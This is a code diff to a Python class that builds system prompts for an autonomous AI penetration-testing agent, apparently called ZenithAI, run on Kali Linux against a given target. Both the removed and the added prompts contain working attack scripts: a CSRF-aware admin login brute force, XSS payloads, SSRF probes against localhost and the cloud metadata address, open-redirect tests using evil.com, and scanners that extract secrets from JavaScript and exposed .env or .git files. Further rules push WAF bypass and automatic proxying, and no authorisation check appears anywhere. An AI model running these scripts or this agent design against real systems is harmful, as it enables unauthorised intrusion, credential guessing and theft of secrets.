@@ -223,65 +223,42 @@ class AIBrain:
         if vulns:
             kb_summary += f"Vulns: {[v.get('title','')[:30] for v in vulns[:3]]}\n"
         
-        return f"""You are an elite pentester AI on Kali Linux. Target: {target}. Phase: {phase}.
-Goal: {goal[:500]}
-
-{kb_summary}
-Last cmd: {last_command[:100] if last_command else 'None'}
-Output: {last_output[:600] if last_output else 'None'}
-
-ABSOLUTE RULES:
-1. NEVER add proxychains/torsocks - proxy is AUTOMATIC
-2. NEVER use nmap -p- - use --top-ports 1000 or -F
-3. ONLY action values allowed: COMMAND, GOAL_ACHIEVED, SWITCH_PHASE
-4. NEVER repeat a command that already failed. Use DIFFERENT tool
-5. If output says "not found" - that tool is NOT installed. Use alternative
-6. Speed: nmap -T4, sqlmap --batch --threads=10, ffuf -t 50
-7. Wordlists: /usr/share/wordlists/rockyou.txt, /usr/share/wordlists/dirb/common.txt
-8. Use bash -c 'for...' for loops (not raw for/while)
-9. If blocked/refused, switch to OSINT (crt.sh, dig, whois)
-10. curl: -sk --max-time 15
-11. If sqlmap needs CSRF: use --csrf-token and --threads=1 (not 10)
-12. Hydra for web: get fresh CSRF token each time or it gives false positives
-13. ALTERNATE: After any basic tool command, your NEXT command MUST be a custom bash/python script
-14. Pattern: tool → script → tool → script (NEVER 2 basic tools in a row)
-15. Scripts = bash -c '...' or python3 -c '...' with loops, pipes, multi-step logic
-
-INSTALLED TOOLS: nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, python3, bash, sed, awk
-NOT INSTALLED: httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan
-
-=== ADVANCED SCRIPTING (USE THIS! Better than basic tools) ===
-Write custom scripts instead of relying on basic tool commands:
-
-CRAWL & EXTRACT LINKS: bash -c 'curl -sk https://{target}/ | grep -oP "(href|src)=\"[^\"]+\"" | sort -u'
-FIND JS FILES & SECRETS: bash -c 'for js in $(curl -sk https://{target}/ | grep -oP "src=\"[^\"]+\\.js\"" | grep -oP "\"[^\"]+\"" | tr -d \'\"\'); do echo "==$js=="; curl -sk "https://{target}/$js" 2>/dev/null | grep -oiE "(api[_-]?key|token|secret|password|authorization|firebase|aws_)[a-zA-Z0-9_]*[=:][^\"\' ]+" | head -20; done'
-PARAMETER FUZZING: bash -c 'for p in id user admin page file path cmd search query url redirect next callback; do r=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/page?$p=test123" --max-time 10); echo "$p -> $r"; done'
-CSRF-AWARE LOGIN BRUTE: bash -c 'for pw in admin password 123456 admin123 letmein master; do TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie | grep -oP "name=\"_token\" value=\"\\K[^\"]+"); RESP=$(curl -sk -X POST https://{target}/login -b /tmp/zcookie -d "email=admin@{target}&password=$pw&_token=$TOKEN" -w "\n%{{http_code}}" -o /tmp/zbody --max-time 15); CODE=$(echo "$RESP" | tail -1); SIZE=$(wc -c < /tmp/zbody); echo "$pw -> HTTP $CODE (size: $SIZE)"; done'
-SECURITY HEADER CHECK: bash -c 'H=$(curl -skI https://{target}/); echo "$H" | head -20; echo "---MISSING HEADERS---"; for h in X-Frame-Options Content-Security-Policy X-XSS-Protection Strict-Transport-Security X-Content-Type-Options; do echo "$H" | grep -qi "$h" || echo "MISSING: $h"; done'
-SUBDOMAIN BRUTE: bash -c 'for sub in www mail ftp admin dev staging api test vpn portal app cdn; do ip=$(dig +short $sub.{target} 2>/dev/null | head -1); [ -n "$ip" ] && echo "FOUND: $sub.{target} -> $ip"; done'
-DIR ENUM CUSTOM: bash -c 'for p in .env .git/HEAD wp-config.php.bak robots.txt sitemap.xml .htaccess server-status info.php phpinfo.php api/v1 graphql .well-known/security.txt debug trace web.config; do CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{target}/$p" --max-time 10); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "$p -> $CODE"; done'
-XSS PROBE: bash -c 'PAYLOADS=(\'<script>alert(1)</script>\' \'"onmouseover=alert(1)\' \'\'\'><img src=x onerror=alert(1)>\' \'javascript:alert(1)\'); for param in $(curl -sk https://{target}/ | grep -oP "name=\"\\K[^\"]+" | sort -u); do for pay in "${{PAYLOADS[@]}}"; do RESP=$(curl -sk "https://{target}/?$param=$pay" --max-time 10); echo "$RESP" | grep -q "alert(1)" && echo "POSSIBLE XSS: $param with $pay"; done; done'
-PYTHON SCANNER: python3 -c "import urllib.request,ssl,json; ctx=ssl._create_unverified_context(); [print(f'{{p}}: {{urllib.request.urlopen(f\"https://{target}/{{p}}\",context=ctx).status}}') for p in ['.env','debug','trace','api','graphql','wp-json/wp/v2/users','server-info','.git/config'] if (lambda u: (True, urllib.request.urlopen(u,context=ctx).status))(f'https://{target}/{{p}}')]"
-WAYBACK ENUM: bash -c 'curl -s "http://web.archive.org/cdx/search/cdx?url={target}/*&output=text&fl=original&collapse=urlkey" 2>/dev/null | head -50 | sort -u'
-OPEN REDIRECT TEST: bash -c 'for param in url redirect next callback return_to goto dest destination rurl; do for target_url in "https://evil.com" "//evil.com" "/\\evil.com"; do CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{target}/?$param=$target_url" --max-time 10); [ "$CODE" = "301" ] || [ "$CODE" = "302" ] && echo "POSSIBLE REDIRECT: $param=$target_url -> $CODE"; done; done'
-SSRF PROBE: bash -c 'for param in url file path page load fetch src dest redirect; do RESP=$(curl -sk "https://{target}/?$param=http://127.0.0.1:22" -w "\n%{{http_code}}" --max-time 10); echo "$param -> $(echo $RESP | tail -1)"; done'
-
-ALWAYS prefer scripts when:
-- Basic tools fail or timeout
-- Need multi-step logic (get token → use token → check result)
-- Need to chain results (find URLs → test each one)
-- WAF blocks standard tools (custom curl bypasses WAF signatures)
-- Need to test specific parameters or endpoints
-
-RESPOND JSON ONLY:
-{{"reasoning":"why","action":"COMMAND","command":"linux cmd or bash script","phase":"{phase}","expected_outcome":"what"}}
-OR: {{"reasoning":"done","action":"GOAL_ACHIEVED","findings_summary":"results","phase":"REPORT"}}
-"""
+        prompt = f"You are an elite pentester AI on Kali Linux. Target: {target}. Phase: {phase}.\n"
+        prompt += f"Goal: {goal[:500]}\n\n"
+        prompt += f"{kb_summary}\n"
+        prompt += f"Last cmd: {last_command[:100] if last_command else 'None'}\n"
+        prompt += f"Output: {last_output[:600] if last_output else 'None'}\n\n"
+        prompt += "ABSOLUTE RULES:\n"
+        prompt += "1. NEVER add proxychains/torsocks - proxy is AUTOMATIC\n"
+        prompt += "2. NEVER use nmap -p- - use --top-ports 1000 or -F\n"
+        prompt += "3. Allowed actions: COMMAND, SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE\n"
+        prompt += "4. NEVER repeat a failed command. Use DIFFERENT tool or approach\n"
+        prompt += "5. If output says 'not found' - tool NOT installed. Use alternative\n"
+        prompt += "6. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (never 2 basic tools in a row)\n"
+        prompt += "7. For complex multi-step ops, use SCRIPT action (file-based, no quoting issues)\n"
+        prompt += "8. Wordlists: /usr/share/wordlists/dirb/common.txt, /usr/share/wordlists/rockyou.txt\n"
+        prompt += "9. If blocked/refused, switch to OSINT (crt.sh, dig, whois)\n"
+        prompt += "10. curl: -sk --max-time 15\n\n"
+        prompt += "INSTALLED: nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, python3, bash\n"
+        prompt += "NOT INSTALLED: httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan\n\n"
+        prompt += "RESPOND WITH ONE OF THESE JSON FORMATS:\n\n"
+        prompt += "1. Basic tool:\n"
+        prompt += '{{"reasoning":"why","action":"COMMAND","command":"nmap -sV -T4 --top-ports 1000 ' + target + '","phase":"' + phase + '","expected_outcome":"what"}}\n\n'
+        prompt += "2. SCRIPT file (PREFERRED for complex tasks!):\n"
+        prompt += '{{"reasoning":"why","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"' + target + '\\"\\necho \'=== Scan ===\'\\nfor p in .env .git/HEAD robots.txt; do\\n  code=$(curl -sk -o /dev/null -w \'%{http_code}\' \\"https://$target/$p\\" --max-time 10)\\n  [ \\"$code\\" != \\"404\\" ] && echo \\"$p -> $code\\"\\ndone","phase":"' + phase + '","expected_outcome":"what"}}\n\n'
+        prompt += "3. Python SCRIPT:\n"
+        prompt += '{{"reasoning":"why","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl\\nctx = ssl._create_unverified_context()\\ntarget = \'' + target + '\'\\nfor p in [\'.env\',\'robots.txt\',\'api/v1\']:\\n    try:\\n        r = urllib.request.urlopen(f\'https://{target}/{p}\', context=ctx, timeout=10)\\n        print(f\'[{r.status}] /{p}\')\\n    except: pass","phase":"' + phase + '","expected_outcome":"what"}}\n\n'
+        prompt += "4. Done:\n"
+        prompt += '{{"reasoning":"done","action":"GOAL_ACHIEVED","findings_summary":"results","phase":"REPORT"}}\n'
+        return prompt
 
     def _build_gemini_prompt(self, target, goal, knowledge_base, last_command, last_output, phase):
-        """Build full prompt for Gemini (larger context)."""
-        return f"""
-You are ZenithAI - an elite autonomous pentester on Kali Linux.
+        """Build full prompt for Gemini (larger context) - uses SCRIPT action for file-based scripts."""
+        kb_json = json.dumps(knowledge_base, indent=2, default=str)[:3000]
+        last_cmd_str = last_command if last_command else "None"
+        last_out_str = last_output[:1500] if last_output else "None"
+        
+        prompt = f"""You are ZenithAI - an elite autonomous pentester on Kali Linux.
 Analyze outputs carefully and choose the BEST next action.
 
 === MISSION ===
@@ -290,128 +267,100 @@ Goal: {goal[:2000]}
 Phase: {phase}
 
 === KNOWLEDGE BASE ===
-{json.dumps(knowledge_base, indent=2, default=str)[:3000]}
+{kb_json}
 
 === LAST ACTION ===
-Command: {last_command if last_command else "None"}
-Output: {last_output[:1500] if last_output else "None"}
+Command: {last_cmd_str}
+Output: {last_out_str}
 
 === ABSOLUTE RULES (VIOLATION = SCAN FAILURE) ===
-1. NEVER add proxychains, torsocks, or any proxy wrapper. Proxy is AUTOMATIC. "proxychains nmap" = DOUBLE proxy = BROKEN.
+1. NEVER add proxychains, torsocks, or any proxy wrapper. Proxy is AUTOMATIC.
 2. NEVER use nmap -p- (takes forever). Use --top-ports 1000 or -F.
-3. ONLY allowed actions: COMMAND, GOAL_ACHIEVED, SWITCH_PHASE. Nothing else (no DNS_RESOLUTION, PORT_SCAN, etc).
-4. NEVER repeat a failed command. Use a COMPLETELY DIFFERENT tool.
+3. Allowed actions: COMMAND, SCRIPT, GOAL_ACHIEVED, SWITCH_PHASE
+4. NEVER repeat a failed command. Use a COMPLETELY DIFFERENT tool or script.
 5. If output says "not found", the tool is NOT installed. Skip it forever.
-6. Use bash -c '...' for shell loops (for/while/do). Raw loops WILL break.
+6. NEVER use bash -c '...' for complex scripts! Use SCRIPT action instead (writes to file).
 7. If connection refused/blocked, switch to passive OSINT immediately.
-8. sqlmap + CSRF: use --csrf-token="_token" --csrf-url=URL --threads=1 (NOT 10, they conflict).
-9. Hydra + CSRF: CSRF tokens expire. For Laravel, get fresh token per request or expect false positives.
+8. sqlmap + CSRF: use --csrf-token="_token" --csrf-url=URL --threads=1
+9. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (NEVER 2 basic tools in a row)
+10. SCRIPT action is PREFERRED for multi-step, loops, curl with special chars, etc.
 
-=== INSTALLED TOOLS (USE THESE ONLY) ===
-nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, sed, awk, bash
+=== INSTALLED TOOLS ===
+nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, sed, awk, bash, python3
 
 === NOT INSTALLED (DO NOT USE) ===
-httpx(Go version), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan
+httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan
 
 === SPEED RULES ===
-- nmap: -sV -sC -T4 --top-ports 1000 (NEVER -p-)
-- sqlmap: --batch --level=3 --risk=3 (add --threads=10 ONLY without --csrf-url)
+- nmap: -sV -sC -T4 --top-ports 1000
+- sqlmap: --batch --level=3 --risk=3 --threads=10 (threads=1 if CSRF)
 - ffuf: -w /usr/share/wordlists/dirb/common.txt -t 50 -mc 200,301,302,403
-- curl: -sk --max-time 15 (quick checks)
-- nuclei: -u URL -severity critical,high (NOT -l with empty files)
-- Prefer: nuclei > nikto, ffuf > gobuster, curl > httpx
+- curl: -sk --max-time 15
+- nuclei: -u URL -severity critical,high
 
-=== KALI WORDLISTS ===
+=== WORDLISTS ===
+- /usr/share/wordlists/dirb/common.txt (web dirs - fast)
 - /usr/share/wordlists/rockyou.txt (passwords)
-- /usr/share/wordlists/dirb/common.txt (web dirs - SMALL, fast)
-- /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt (web dirs - MEDIUM)
 - /usr/share/wordlists/fasttrack.txt (quick passwords)
 
-=== SMART TECHNIQUES ===
-- Subdomains: assetfinder --subs-only domain.tld
-- Probe subs: bash -c 'for s in $(cat subs.txt); do curl -sk -o /dev/null -w "%{{http_code}} $s\n" http://$s --max-time 10; done'
-- DNS: dig ANY domain.tld, dig axfr domain.tld @ns
-- SSL: echo | openssl s_client -connect host:443 2>/dev/null | openssl x509 -noout -text
-- Certs: curl -s "https://crt.sh/?q=%25.domain.tld&output=json" | jq -r '.[].name_value' | sort -u
-- Wayback: curl -s "http://web.archive.org/cdx/search/cdx?url=domain.tld/*&output=text&fl=original&collapse=urlkey"
-- Web tech: curl -sI https://target | head -30
-- Exploits: searchsploit service version
+=== ACTION FORMATS (JSON ONLY) ===
 
-=== ⚡ ADVANCED SCRIPTING (PREFERRED OVER BASIC TOOLS) ===
-You are an elite hacker. Write CUSTOM scripts that are smarter than basic tool runs.
-ALWAYS prefer writing bash/python scripts when possible. They bypass WAFs, handle multi-step logic, and give better results.
+FORMAT 1 - Basic tool command (simple one-liners):
+{{"reasoning":"why","action":"COMMAND","command":"nmap -sV -T4 --top-ports 1000 {target}","phase":"{phase}","expected_outcome":"what"}}
 
---- WEB CRAWLING & LINK EXTRACTION ---
-bash -c 'curl -sk https://{target}/ | grep -oP "(href|src)=\\"[^\\"]+\\"" | sed "s/href=//;s/src=//;s/\\"//g" | sort -u | while read url; do [[ "$url" == /* ]] && url="https://{target}$url"; echo "$url"; done'
+FORMAT 2 - SCRIPT file (PREFERRED for complex tasks!):
+The SCRIPT action writes code to a file and executes it. NO quoting issues. NO escaping hell.
+Use this for ANY multi-step logic, loops, curl with %{{http_code}}, grep with regex, etc.
 
---- FIND JAVASCRIPT FILES & EXTRACT SECRETS ---
-bash -c 'for js in $(curl -sk https://{target}/ | grep -oP "src=\\"[^\\"]+\\.js\\"" | grep -oP "\\"[^\\"]+\\"" | tr -d \'\\"\'); do full_url="$js"; [[ "$js" == /* ]] && full_url="https://{target}$js"; echo "\n=== $full_url ==="; curl -sk "$full_url" 2>/dev/null | grep -oiE "(api[_-]?key|token|secret|password|authorization|firebase|aws_|private[_-]?key|access[_-]?key)[a-zA-Z0-9_]*[\\"\'\'=:][^\\"\'\' ,;}}]+" | head -30; done'
+BASH SCRIPT EXAMPLE - Sensitive File Discovery:
+{{"reasoning":"Scan for sensitive files and configs","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Sensitive File Discovery ==='\\nfor p in .env .git/HEAD .git/config wp-config.php.bak .htaccess .htpasswd server-status server-info phpinfo.php robots.txt sitemap.xml .well-known/security.txt api/v1 graphql swagger/v1/swagger.json wp-json/wp/v2/users actuator/env actuator/health; do\\n  RESP=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \\"https://$target/$p\\" --max-time 10 2>/dev/null)\\n  HTTP=$(echo \\"$RESP\\" | cut -d: -f1)\\n  SIZE=$(echo \\"$RESP\\" | cut -d: -f2)\\n  [ \\"$HTTP\\" != \\"404\\" ] && [ \\"$HTTP\\" != \\"000\\" ] && [ \\"$SIZE\\" != \\"0\\" ] && echo \\"$p -> HTTP $HTTP ($SIZE bytes)\\"\\ndone","phase":"{phase}","expected_outcome":"Find exposed sensitive files"}}
 
---- SMART PARAMETER DISCOVERY & FUZZING ---
-bash -c 'echo "=== Form Parameters ==="; curl -sk https://{target}/ | grep -oP "name=\\"\\K[^\\"]+" | sort -u; echo "\n=== URL Parameter Fuzz ==="; for p in id user admin page file path cmd search query url redirect next callback action type format debug test; do r=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/?$p=test123zenith" --max-time 10); echo "$p -> $r"; done'
+BASH SCRIPT EXAMPLE - Security Headers Audit:
+{{"reasoning":"Check security headers","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Security Headers ==='\\nH=$(curl -skI \\"https://$target/\\")\\necho \\"$H\\" | head -20\\necho '--- Missing Headers ---'\\nfor h in X-Frame-Options Content-Security-Policy X-XSS-Protection Strict-Transport-Security X-Content-Type-Options Referrer-Policy Permissions-Policy; do\\n  echo \\"$H\\" | grep -qi \\"$h\\" || echo \\"MISSING: $h\\"\\ndone\\necho '--- Cookie Security ---'\\necho \\"$H\\" | grep -i set-cookie | while read line; do\\n  echo \\"$line\\" | grep -qi httponly || echo \\"Cookie missing HttpOnly\\"\\n  echo \\"$line\\" | grep -qi secure || echo \\"Cookie missing Secure\\"\\n  echo \\"$line\\" | grep -qi samesite || echo \\"Cookie missing SameSite\\"\\ndone","phase":"{phase}","expected_outcome":"Identify missing security headers"}}
 
---- CSRF-AWARE LOGIN BRUTE FORCE (Laravel/PHP) ---
-bash -c 'echo "=== Login Brute Force (CSRF-aware) ==="; for pw in admin password 123456 admin123 letmein master welcome P@ssw0rd root toor changeme; do TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie 2>/dev/null | grep -oP "name=\\"_token\\" value=\\"\\K[^\\"]+"); if [ -z "$TOKEN" ]; then TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie 2>/dev/null | grep -oP "csrf[_-]token.*?content=\\"\\K[^\\"]+"); fi; RESP=$(curl -sk -X POST https://{target}/login -b /tmp/zcookie -d "email=admin@{target}&password=$pw&_token=$TOKEN" -w "HTTP_%{{http_code}}_SIZE_%{{size_download}}" -o /tmp/zbody -D /tmp/zheaders --max-time 15 2>/dev/null); CODE=$(echo "$RESP" | grep -oP "HTTP_\\K[0-9]+"); SIZE=$(echo "$RESP" | grep -oP "SIZE_\\K[0-9]+"); REDIR=$(grep -i "location:" /tmp/zheaders 2>/dev/null | head -1); echo "$pw -> HTTP $CODE (size: $SIZE) $REDIR"; sleep 1; done'
+BASH SCRIPT EXAMPLE - Parameter Fuzzing:
+{{"reasoning":"Fuzz URL parameters","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Parameter Fuzzing ==='\\nfor p in id user admin page file path cmd search query url redirect next callback action type format debug test token key api; do\\n  r=$(curl -sk -o /dev/null -w '%{{http_code}}:%{{size_download}}' \\"https://$target/?$p=test123zenith\\" --max-time 10)\\n  echo \\"$p -> $r\\"\\ndone","phase":"{phase}","expected_outcome":"Discover active parameters"}}
 
---- SECURITY HEADER AUDIT ---
-bash -c 'echo "=== Security Header Analysis ==="; H=$(curl -skI https://{target}/); echo "$H" | head -20; echo "\n--- Missing Security Headers ---"; for h in "X-Frame-Options" "Content-Security-Policy" "X-XSS-Protection" "Strict-Transport-Security" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy" "Cross-Origin-Opener-Policy" "Cross-Origin-Resource-Policy"; do echo "$H" | grep -qi "$h" || echo "⚠ MISSING: $h"; done; echo "\n--- Cookie Security ---"; echo "$H" | grep -i set-cookie | while read line; do echo "$line" | grep -qi "httponly" || echo "⚠ Cookie missing HttpOnly"; echo "$line" | grep -qi "secure" || echo "⚠ Cookie missing Secure flag"; echo "$line" | grep -qi "samesite" || echo "⚠ Cookie missing SameSite"; done'
+BASH SCRIPT EXAMPLE - JS Secrets Scanner:
+{{"reasoning":"Find secrets in JavaScript files","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== JS Secrets Scanner ==='\\nfor js in $(curl -sk \\"https://$target/\\" | grep -oE 'src=\\"[^\\"]+\\\\.js\\"' | sed 's/src=\\"//;s/\\"//' | head -20); do\\n  [[ \\"$js\\" == /* ]] && js=\\"https://$target$js\\"\\n  echo \\"\\\\n=== $js ===\\"\\n  curl -sk \\"$js\\" 2>/dev/null | grep -oiE '(api[_-]?key|token|secret|password|auth|firebase|aws_|private[_-]?key)[a-zA-Z0-9_]*[=:][^ ,;]+' | head -20\\ndone","phase":"{phase}","expected_outcome":"Extract hardcoded secrets from JS"}}
 
---- SUBDOMAIN BRUTEFORCE ---
-bash -c 'echo "=== Subdomain Bruteforce ==="; for sub in www mail ftp admin dev staging api test vpn portal app cdn beta internal git jenkins ci cd grafana kibana elastic monitor status blog shop store; do ip=$(dig +short $sub.{target} 2>/dev/null | head -1); [ -n "$ip" ] && echo "FOUND: $sub.{target} -> $ip"; done'
+BASH SCRIPT EXAMPLE - Subdomain Bruteforce:
+{{"reasoning":"Bruteforce subdomains","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Subdomain Bruteforce ==='\\nfor sub in www mail ftp admin dev staging api test vpn portal app cdn beta internal git jenkins grafana kibana monitor status blog shop; do\\n  ip=$(dig +short $sub.$target 2>/dev/null | head -1)\\n  [ -n \\"$ip\\" ] && echo \\"FOUND: $sub.$target -> $ip\\"\\ndone","phase":"{phase}","expected_outcome":"Discover subdomains"}}
 
---- SENSITIVE FILE DISCOVERY ---
-bash -c 'echo "=== Sensitive File Discovery ==="; for p in .env .git/HEAD .git/config wp-config.php.bak .htaccess .htpasswd server-status server-info info.php phpinfo.php test.php debug trace web.config appsettings.json config.json config.yml config.php database.yml .DS_Store Thumbs.db crossdomain.xml clientaccesspolicy.xml sitemap.xml robots.txt security.txt .well-known/security.txt api/ api/v1 api/v2 graphql swagger swagger/v1/swagger.json api-docs v1/api-docs openapi.json wp-json/wp/v2/users actuator/env actuator/health; do CODE=$(curl -sk -o /tmp/zbody -w "%{{http_code}}:%{{size_download}}" "https://{target}/$p" --max-time 10 2>/dev/null); HTTP=$(echo "$CODE" | cut -d: -f1); SIZE=$(echo "$CODE" | cut -d: -f2); [ "$HTTP" != "404" ] && [ "$HTTP" != "000" ] && [ "$SIZE" != "0" ] && echo "$p -> HTTP $HTTP ($SIZE bytes)"; done'
+BASH SCRIPT EXAMPLE - CSRF-Aware Login Brute:
+{{"reasoning":"Brute force login with CSRF token handling","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== CSRF-Aware Login Brute ==='\\nfor pw in admin password 123456 admin123 letmein master welcome root toor changeme; do\\n  TOKEN=$(curl -sk \\"https://$target/login\\" -c /tmp/zcookie 2>/dev/null | grep -oP 'name=\\"_token\\" value=\\"[^\\"]+' | sed 's/.*value=\\"//')\\n  RESP=$(curl -sk -X POST \\"https://$target/login\\" -b /tmp/zcookie -d \\"email=admin@$target&password=$pw&_token=$TOKEN\\" -w '\\\\nHTTP_%{{http_code}}_SIZE_%{{size_download}}' -o /tmp/zbody -D /tmp/zheaders --max-time 15 2>/dev/null)\\n  echo \\"$pw -> $RESP\\"\\n  sleep 1\\ndone","phase":"{phase}","expected_outcome":"Test common passwords with CSRF handling"}}
 
---- XSS TESTING SCRIPT ---
-bash -c 'echo "=== XSS Testing ==="; PARAMS=$(curl -sk https://{target}/ | grep -oP "name=\\"\\K[^\\"]+" | sort -u); PAYLOADS=(\'<script>alert(1)</script>\' \'"onmouseover="alert(1)"\' \'\'\'><img src=x onerror=alert(1)>\' \'<svg onload=alert(1)>\' \'javascript:alert(1)\'); for param in $PARAMS; do for pay in "${{PAYLOADS[@]}}"; do RESP=$(curl -sk "https://{target}/?$param=$(echo $pay | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null)" --max-time 10 2>/dev/null); echo "$RESP" | grep -q "alert(1)" && echo "⚠ POSSIBLE XSS: param=$param payload=$pay"; done; done'
+BASH SCRIPT EXAMPLE - Open Redirect Test:
+{{"reasoning":"Test for open redirect vulnerabilities","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Open Redirect Test ==='\\nfor param in url redirect next callback return_to goto dest destination rurl; do\\n  for redir in 'https://evil.com' '//evil.com' '/\\\\evil.com'; do\\n    RESP=$(curl -sk -D /tmp/zheaders -o /dev/null \\"https://$target/?$param=$redir\\" --max-time 10 2>/dev/null)\\n    LOC=$(grep -i '^location:' /tmp/zheaders 2>/dev/null | head -1)\\n    [ -n \\"$LOC\\" ] && echo \\"REDIRECT: $param=$redir -> $LOC\\"\\n  done\\ndone","phase":"{phase}","expected_outcome":"Find open redirect vulnerabilities"}}
 
---- OPEN REDIRECT TESTING ---
-bash -c 'echo "=== Open Redirect Testing ==="; for param in url redirect next callback return_to goto dest destination rurl redirect_url continue return; do for target_url in "https://evil.com" "//evil.com" "/\\\\evil.com" "////evil.com" "https:evil.com"; do RESP=$(curl -sk -D- -o /dev/null "https://{target}/?$param=$target_url" --max-time 10 2>/dev/null); LOC=$(echo "$RESP" | grep -i "^location:" | head -1); CODE=$(echo "$RESP" | head -1 | grep -oP "[0-9]{{3}}"); [ -n "$LOC" ] && echo "⚠ REDIRECT: $param=$target_url -> $CODE $LOC"; done; done'
+BASH SCRIPT EXAMPLE - Web Crawl & Link Extract:
+{{"reasoning":"Crawl and extract all links","action":"SCRIPT","script_type":"bash","script":"#!/bin/bash\\ntarget=\\"{target}\\"\\necho '=== Web Crawl ==='\\ncurl -sk \\"https://$target/\\" | grep -oE '(href|src)=\\"[^\\"]+\\"' | sed 's/href=\\"//;s/src=\\"//;s/\\"//' | sort -u | while read url; do\\n  [[ \\"$url\\" == /* ]] && url=\\"https://$target$url\\"\\n  echo \\"$url\\"\\ndone","phase":"{phase}","expected_outcome":"Map all links and resources"}}
 
---- SSRF PROBE ---
-bash -c 'echo "=== SSRF Probe ==="; for param in url file path page load fetch src dest redirect uri data; do RESP=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/?$param=http://127.0.0.1:22" --max-time 10 2>/dev/null); echo "$param -> $RESP"; done'
+PYTHON SCRIPT EXAMPLE - Advanced Path Scanner:
+{{"reasoning":"Python-based path scanner with response analysis","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl, sys\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\npaths = ['.env', '.git/config', 'debug', 'trace', 'api', 'graphql',\\n         'wp-json/wp/v2/users', 'server-info', 'actuator/env',\\n         'swagger/v1/swagger.json', '.well-known/security.txt',\\n         'phpinfo.php', 'robots.txt', 'sitemap.xml']\\nprint('=== Python Path Scanner ===')\\nfor p in paths:\\n    try:\\n        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)\\n        body = r.read(500).decode(errors='ignore')\\n        print(f'[{{r.status}}] /{{p}} ({{len(body)}}b): {{body[:100]}}')\\n    except urllib.error.HTTPError as e:\\n        if e.code != 404:\\n            print(f'[{{e.code}}] /{{p}}')\\n    except: pass","phase":"{phase}","expected_outcome":"Discover accessible paths with response preview"}}
 
---- PYTHON ADVANCED SCANNER ---
-python3 -c "
-import urllib.request, ssl, sys, json
-ctx = ssl._create_unverified_context()
-target = '{target}'
-paths = ['.env', '.git/config', 'debug', 'trace', 'api', 'graphql', 'wp-json/wp/v2/users', 'server-info', 'actuator/env', 'swagger/v1/swagger.json', '.well-known/security.txt']
-for p in paths:
-    try:
-        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)
-        body = r.read(500).decode(errors='ignore')
-        print(f'[{{r.status}}] /{{p}} ({{len(body)}}b): {{body[:100]}}')
-    except urllib.error.HTTPError as e:
-        if e.code != 404: print(f'[{{e.code}}] /{{p}}')
-    except: pass
-"
+PYTHON SCRIPT EXAMPLE - SSRF Probe:
+{{"reasoning":"Test for SSRF","action":"SCRIPT","script_type":"python","script":"import urllib.request, ssl, socket\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\nparams = ['url', 'file', 'path', 'page', 'load', 'fetch', 'src', 'dest', 'redirect', 'uri']\\nssrf_targets = ['http://127.0.0.1:22', 'http://localhost:80', 'http://169.254.169.254/latest/meta-data/']\\nprint('=== SSRF Probe ===')\\nfor param in params:\\n    for st in ssrf_targets:\\n        try:\\n            r = urllib.request.urlopen(f'https://{{target}}/?{{param}}={{st}}', context=ctx, timeout=10)\\n            print(f'INTERESTING: {{param}}={{st}} -> {{r.status}} ({{len(r.read(200))}}b)')\\n        except urllib.error.HTTPError as e:\\n            if e.code not in [404, 403]:\\n                print(f'NOTE: {{param}}={{st}} -> {{e.code}}')\\n        except: pass","phase":"{phase}","expected_outcome":"Identify SSRF vulnerabilities"}}
 
